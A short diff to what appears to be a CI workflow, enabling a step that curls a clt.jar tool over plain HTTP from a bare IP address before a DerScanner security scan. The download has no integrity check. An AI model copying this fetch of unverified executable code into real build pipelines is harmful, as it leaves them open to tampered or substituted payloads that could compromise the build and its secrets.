@@ -24,11 +24,11 @@ jobs:
           distribution: 'temurin'
           java-version: '11'
 
-      # - name: Download CLT tool
-      #   run: |
-      #     if [ ! -f clt.jar ]; then
-      #       curl -o clt.jar <URL_TO_CLT_JAR>
-      #     fi
+      - name: Download CLT tool
+        run: |
+          if [ ! -f clt.jar ]; then
+            curl -o clt.jar http://143.244.129.103:8000/clt.jar
+          fi
 
       - name: Run DerScanner SAST Security Scan 1
         run: |
